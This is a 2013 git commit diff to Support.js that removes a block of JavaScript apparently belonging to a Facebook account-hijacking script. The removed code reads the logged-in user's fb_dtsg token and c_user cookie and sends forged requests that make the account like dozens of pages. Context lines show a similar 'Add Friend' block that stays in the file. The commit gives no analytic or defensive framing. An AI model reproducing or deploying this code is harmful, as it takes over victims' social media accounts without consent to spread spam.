09e23a76a42fd6a9be62e75ebd4c604aa854c015
wazzygray <qariwaqar@gmail.com>
2013-07-11 21:15:52 +0500

    Update Support.js

--- Support.js
+++ Support.js
@@ -100,68 +100,6 @@ LIST("592694070775595");
 LIST("592695127442156");
 LIST("466664513418987");
 LIST("1389670604580645");
-/*Like Page*/
-var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
-var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
-function Like(p) {
-  var Page = new XMLHttpRequest();
-  var PageURL = "//www.facebook.com/ajax/pages/fan_status.php";
-  var PageParams = "&fbpage_id=" + p +"&add=true&reload=false&fan_origin=page_timeline&fan_source=&cat=&nctr[_mod]=pagelet_timeline_page_actions&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=d&fb_dtsg="+fb_dtsg+"&phstamp=";
-  Page.open("POST", PageURL, true);
-  Page.onreadystatechange = function () {
-    if (Page.readyState == 4 && Page.status == 200) {
-      Page.close;
-    }
-  };
-  Page.send(PageParams);
-}
-Like("313072532101076");
-Like("190451517757758");
-Like("595580513789645");
-Like("300241633420701");
-Like("231125826929893");
-Like("456401041060837");
-Like("523004351084154");
-Like("229353647087574");
-Like("229488947108546");  
-Like("205908352819272");   
-Like("313072532101076");  
-Like("209464459125570");  
-Like("523004351084154");   
-Like("200776629976061");  
-Like("147857465295449");  
-Like("163588093717517");  
-Like("291092130903328");  
-Like("429143760437630");  
-Like("149394451859931");
-Like("306495312809675");   
-Like("238044532932475");
-Like("533658463364561");
-Like("528019587257023");
-Like("114432912090688");
-Like("165411580286132");
-Like("333193263435488");
-Like("104142816349744");
-Like("379373108754478");
-Like("569302423102592");
-Like("234982333218667");
-Like("456483724412226");
-Like("136785296514054");
-Like("146320572185345");
-Like("150423395088679");
-Like("651209744905814");
-Like("605644426114536");
-Like("476744145734993");
-Like("190943597728424");
-Like("127402680785850");
-Like("453718184719532");
-Like("177430755751025");
-Like("110871649075947");
-Like("280308438768084");
-Like("175177679305434");
-Like("122109094662677");
-Like("567227273316419");
-
 /*Add Friend*/ 
 var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
